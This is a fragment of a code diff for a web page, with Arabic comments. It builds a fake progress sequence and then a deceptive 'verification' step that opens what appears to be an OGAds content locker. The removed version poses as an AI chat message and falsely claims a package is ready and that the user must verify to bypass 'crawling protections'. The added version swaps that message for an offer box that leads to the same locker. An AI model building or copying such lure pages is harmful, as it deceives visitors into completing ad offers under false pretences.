-                                    <i class="fa-solid fa-user-shield" style="color: var(--primary-accent); font-size: 26px;"></i>
-                                    <h4>Verification Node Prompt</h4>
-                                    <p>The system asset package aggregation is complete. To bypass continuous automated crawling protections and instantly unlock the full panel view, click the verification link below.</p>
-                                    <button class="gpt-action-btn" onclick="openOgadsGate()">
-                                        <i class="fa-solid fa-circle-check"></i> Complete Verification
-                                    </button>
-                                </div>
-                            `;
-                            appendAiMessage(finalLockerHtml);
-                        }, 1000);
+                        // إخفاء الـ Progress وإظهار مساج الـ Offer
+                        progressSection.style.display = 'none';
+                        offerBox.style.display = 'flex';
                     }, 500);
                 }
             }, 30);
         }
 
-        function openOgadsGate() {
+        // فتح الـ Locker عند الضغط على الزر النهائي
+        function triggerFinalOgadsLocker() {
             if (typeof og_load === 'function') {
                 og_load(); 
             } else {
